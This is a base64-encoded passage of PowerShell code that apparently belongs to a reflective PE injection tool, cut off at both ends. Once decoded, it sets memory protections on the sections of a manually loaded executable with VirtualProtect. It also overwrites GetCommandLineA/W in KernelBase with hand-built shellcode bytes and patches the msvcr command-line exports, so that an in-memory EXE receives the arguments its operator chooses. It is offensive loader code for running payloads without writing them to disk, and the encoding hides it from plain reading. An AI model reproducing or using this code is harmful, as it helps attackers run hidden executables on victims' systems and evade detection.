ICAgfQoKICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3VGh1bmtSZWYsICRUaHVua1JlZiwgJGZhbHNlKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFRodW5rUmVmKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSkKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kT3JpZ2luYWxUaHVua1JlZikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPcmlnaW5hbFRodW5rUmVmLCBbVHlwZV1bSW50UHRyXSkKCiAgICAgICAgICAgICAgICAgICAgI0NsZWFudXAKICAgICAgICAgICAgICAgICAgICAjSWYgbG9hZGluZyBieSBvcmRpbmFsLCBQcm9jZWR1cmVOYW1lUHRyIGlzIHRoZSBvcmRpbmFsIHZhbHVlIGFuZCBub3QgYWN0dWFsbHkgYSBwb2ludGVyIHRvIGEgYnVmZmVyIHRoYXQgbmVlZHMgdG8gYmUgZnJlZWQKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJExvYWRCeU9yZGluYWwpIC1hbmQgKCRQcm9jZWR1cmVOYW1lUHRyIC1uZSBbSW50UHRyXTo6WmVybykpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkUHJvY2VkdXJlTmFtZVB0cikKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEltcG9ydERlc2NyaXB0b3JQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEZ1bmN0aW9uIEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVUludDMyXQogICAgICAgICRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRQcm90ZWN0aW9uRmxhZyA9IDB4MAogICAgICAgIGlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fRVhFQ1VURSkgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1JFQUQpIC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9XUklURUNPUFkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9SRUFEKSAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRE9OTFkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fV1JJVEUpIC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX1dSSVRFQ09QWQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQUNDRVNTCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEKSAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRQcm90ZWN0aW9uRmxhZyAtYm9yICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQ0FDSEUKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRQcm90ZWN0aW9uRmxhZwogICAgfQoKICAgIEZ1bmN0aW9uIFVwZGF0ZS1NZW1vcnlQcm90ZWN0aW9uRmxhZ3MKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICBmb3IoICRpID0gMDsgJGkgLWx0ICRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLk51bWJlck9mU2VjdGlvbnM7ICRpKyspCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlNlY3Rpb25IZWFkZXJQdHIpICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikpKQogICAgICAgICAgICAkU2VjdGlvbkhlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRTZWN0aW9uSGVhZGVyUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikKICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFNlY3Rpb25IZWFkZXIuVmlydHVhbEFkZHJlc3MpCiAgICAgICAgICAgIAogICAgICAgICAgICBbVUludDMyXSRQcm90ZWN0RmxhZyA9IEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlICRTZWN0aW9uSGVhZGVyLkNoYXJhY3RlcmlzdGljcwogICAgICAgICAgICBbVUludDMyXSRTZWN0aW9uU2l6ZSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplCiAgICAgICAgICAgIAogICAgICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAgICAgVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiVXBkYXRlLU1lbW9yeVByb3RlY3Rpb25GbGFnczo6VmlydHVhbFByb3RlY3QiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uUHRyIC1TaXplICRTZWN0aW9uU2l6ZSB8IE91dC1OdWxsCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkU2VjdGlvblB0ciwgJFNlY3Rpb25TaXplLCAkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBjaGFuZ2UgbWVtb3J5IHByb3RlY3Rpb24iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAKICAgICNUaGlzIGZ1bmN0aW9uIG92ZXJ3cml0ZXMgR2V0Q29tbWFuZExpbmUgYW5kIEV4aXRUaHJlYWQgd2hpY2ggYXJlIG5lZWRlZCB0byByZWZsZWN0aXZlbHkgbG9hZCBhbiBFWEUKICAgICNSZXR1cm5zIGFuIG9iamVjdCB3aXRoIGFkZHJlc3NlcyB0byBjb3BpZXMgb2YgdGhlIGJ5dGVzIHRoYXQgd2VyZSBvdmVyd3JpdHRlbiAoYW5kIHRoZSBjb3VudCkKICAgIEZ1bmN0aW9uIFVwZGF0ZS1FeGVGdW5jdGlvbnMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRFeGVBcmd1bWVudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRFeGVEb25lQnl0ZVB0cgogICAgICAgICkKICAgICAgICAKICAgICAgICAjVGhpcyB3aWxsIGJlIGFuIGFycmF5IG9mIGFycmF5cy4gVGhlIGlubmVyIGFycmF5IHdpbGwgY29uc2lzdCBvZjogQCgkRGVzdEFkZHIsICRTb3VyY2VBZGRyLCAkQnl0ZUNvdW50KS4gVGhpcyBpcyB1c2VkIHRvIHJldHVybiBtZW1vcnkgdG8gaXRzIG9yaWdpbmFsIHN0YXRlLgogICAgICAgICRSZXR1cm5BcnJheSA9IEAoKSAKICAgICAgICAKICAgICAgICAkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAKICAgICAgICBbSW50UHRyXSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJLZXJuZWwzMi5kbGwiKQogICAgICAgIGlmICgkS2VybmVsMzJIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIktlcm5lbDMyIGhhbmRsZSBudWxsIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRLZXJuZWxCYXNlSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoIktlcm5lbEJhc2UuZGxsIikKICAgICAgICBpZiAoJEtlcm5lbEJhc2VIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIktlcm5lbEJhc2UgaGFuZGxlIG51bGwiCiAgICAgICAgfQoKICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAgICAgI0ZpcnN0IG92ZXJ3cml0ZSB0aGUgR2V0Q29tbWFuZExpbmUoKSBmdW5jdGlvbi4gVGhpcyBpcyB0aGUgZnVuY3Rpb24gdGhhdCBpcyBjYWxsZWQgYnkgYSBuZXcgcHJvY2VzcyB0byBnZXQgdGhlIGNvbW1hbmQgbGluZSBhcmdzIHVzZWQgdG8gc3RhcnQgaXQuCiAgICAgICAgIyAgIFdlIG92ZXJ3cml0ZSBpdCB3aXRoIHNoZWxsY29kZSB0byByZXR1cm4gYSBwb2ludGVyIHRvIHRoZSBzdHJpbmcgRXhlQXJndW1lbnRzLCBhbGxvd2luZyB1cyB0byBwYXNzIHRoZSBleGUgYW55IGFyZ3Mgd2Ugd2FudC4KICAgICAgICAkQ21kTGluZVdBcmdzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsVW5pKCRFeGVBcmd1bWVudHMpCiAgICAgICAgJENtZExpbmVBQXJnc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJEV4ZUFyZ3VtZW50cykKICAgIAogICAgICAgIFtJbnRQdHJdJEdldENvbW1hbmRMaW5lQUFkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWxCYXNlSGFuZGxlLCAiR2V0Q29tbWFuZExpbmVBIikKICAgICAgICBbSW50UHRyXSRHZXRDb21tYW5kTGluZVdBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsQmFzZUhhbmRsZSwgIkdldENvbW1hbmRMaW5lVyIpCgogICAgICAgIGlmICgkR2V0Q29tbWFuZExpbmVBQWRkciAtZXEgW0ludFB0cl06Olplcm8gLW9yICRHZXRDb21tYW5kTGluZVdBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93ICJHZXRDb21tYW5kTGluZSBwdHIgbnVsbC4gR2V0Q29tbWFuZExpbmVBOiAkKEdldC1IZXggJEdldENvbW1hbmRMaW5lQUFkZHIpLiBHZXRDb21tYW5kTGluZVc6ICQoR2V0LUhleCAkR2V0Q29tbWFuZExpbmVXQWRkcikiCiAgICAgICAgfQoKICAgICAgICAjUHJlcGFyZSB0aGUgc2hlbGxjb2RlCiAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMSA9IEAoKQogICAgICAgIGlmICgkUHRyU2l6ZSAtZXEgOCkKICAgICAgICB7CiAgICAgICAgICAgICRTaGVsbGNvZGUxICs9IDB4NDggIzY0Yml0IHNoZWxsY29kZSBoYXMgdGhlIDB4NDggYmVmb3JlIHRoZSAweGI4CiAgICAgICAgfQogICAgICAgICRTaGVsbGNvZGUxICs9IDB4YjgKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSRTaGVsbGNvZGUyID0gQCgweGMzKQogICAgICAgICRUb3RhbFNpemUgPSAkU2hlbGxjb2RlMS5MZW5ndGggKyAkUHRyU2l6ZSArICRTaGVsbGNvZGUyLkxlbmd0aAogICAgICAgIAogICAgICAgIAogICAgICAgICNNYWtlIGNvcHkgb2YgR2V0Q29tbWFuZExpbmVBIGFuZCBHZXRDb21tYW5kTGluZVcKICAgICAgICAkR2V0Q29tbWFuZExpbmVBT3JpZ0J5dGVzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb3RhbFNpemUpCiAgICAgICAgJEdldENvbW1hbmRMaW5lV09yaWdCeXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG90YWxTaXplKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5tZW1jcHkuSW52b2tlKCRHZXRDb21tYW5kTGluZUFPcmlnQnl0ZXNQdHIsICRHZXRDb21tYW5kTGluZUFBZGRyLCBbVUludDY0XSRUb3RhbFNpemUpIHwgT3V0LU51bGwKICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkR2V0Q29tbWFuZExpbmVXT3JpZ0J5dGVzUHRyLCAkR2V0Q29tbWFuZExpbmVXQWRkciwgW1VJbnQ2NF0kVG90YWxTaXplKSB8IE91dC1OdWxsCiAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJEdldENvbW1hbmRMaW5lQUFkZHIsICRHZXRDb21tYW5kTGluZUFPcmlnQnl0ZXNQdHIsICRUb3RhbFNpemUpCiAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJEdldENvbW1hbmRMaW5lV0FkZHIsICRHZXRDb21tYW5kTGluZVdPcmlnQnl0ZXNQdHIsICRUb3RhbFNpemUpCgogICAgICAgICNPdmVyd3JpdGUgR2V0Q29tbWFuZExpbmVBCiAgICAgICAgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCiAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZUFBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgaWYgKCRTdWNjZXNzID0gJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgPSAkR2V0Q29tbWFuZExpbmVBQWRkcgogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUxIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcAogICAgICAgICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRDbWRMaW5lQUFyZ3NQdHIsICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCwgJGZhbHNlKQogICAgICAgICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCAkUHRyU2l6ZQogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUyIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcAogICAgICAgIAogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lQUFkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZVcKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lV0FkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0oJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKICAgICAgICBpZiAoJFN1Y2Nlc3MgPSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCA9ICRHZXRDb21tYW5kTGluZVdBZGRyCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTEgLU1lbW9yeUFkZHJlc3MgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wCiAgICAgICAgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wICgkU2hlbGxjb2RlMS5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJENtZExpbmVXQXJnc1B0ciwgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wLCAkZmFsc2UpCiAgICAgICAgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wICRQdHJTaXplCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTIgLU1lbW9yeUFkZHJlc3MgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wCiAgICAgICAgCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkR2V0Q29tbWFuZExpbmVXQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgICNGb3IgQysrIHN0dWZmIHRoYXQgaXMgY29tcGlsZWQgd2l0aCB2aXN1YWwgc3R1ZGlvIGFzICJtdWx0aXRocmVhZGVkIERMTCIsIHRoZSBhYm92ZSBtZXRob2Qgb2Ygb3ZlcndyaXRpbmcgR2V0Q29tbWFuZExpbmUgZG9lc24ndCB3b3JrLgogICAgICAgICMgICBJIGRvbid0IGtub3cgd2h5IGV4YWN0bHkuLiBCdXQgdGhlIG1zdmNyIERMTCB0aGF0IGEgIkRMTCBjb21waWxlZCBleGVjdXRhYmxlIiBpbXBvcnRzIGhhcyBhbiBleHBvcnQgY2FsbGVkIF9hY21kbG4gYW5kIF93Y21kbG4uCiAgICAgICAgIyAgIEl0IGFwcGVhcnMgdG8gY2FsbCBHZXRDb21tYW5kTGluZSBhbmQgc3RvcmUgdGhlIHJlc3VsdCBpbiB0aGlzIHZhci4gVGhlbiB3aGVuIHlvdSBjYWxsIF9fd2dldGNtZGxuIGl0IHBhcnNlcyBhbmQgcmV0dXJucyB0aGUKICAgICAgICAjICAgYXJndiBhbmQgYXJnYyB2YWx1ZXMgc3RvcmVkIGluIHRoZXNlIHZhcmlhYmxlcy4gU28gdGhlIGVhc3kgdGhpbmcgdG8gZG8gaXMganVzdCBvdmVyd3JpdGUgdGhlIHZhcmlhYmxlIHNpbmNlIHRoZXkgYXJlIGV4cG9ydGVkLgogICAgICAgICREbGxMaXN0ID0gQCgibXN2Y3I3MGQuZGxsIiwgIm1zdmNyNzFkLmRsbCIsICJtc3ZjcjgwZC5kbGwiLCAibXN2Y3I5MGQuZGxsIiwgIm1zdmNyMTAwZC5kbGwiLCAibXN2Y3IxMTBkLmRsbCIsICJtc3ZjcjcwLmRsbCIgYAogICAgICAgICAgICAsICJtc3ZjcjcxLmRsbCIsICJtc3ZjcjgwLmRsbCIsICJtc3ZjcjkwLmRsbCIsICJtc3ZjcjEwMC5kbGwiLCAibXN2Y3IxMTAuZGxsIikKICAgICAgICAKICAgICAgICBmb3JlYWNoICgkRGxsIGluICREbGxMaXN0KQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kRGxsSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoJERsbCkKICAgICAgICAgICAgaWYgKCREbGxIYW5kbGUgLW5lIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBbSW50UHRyXSRXQ21kTG5BZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkRGxsSGFuZGxlLCAiX3djbWRsbiIpCiAgICAgICAgICAgICAgICBbSW50UHRyXSRBQ21kTG5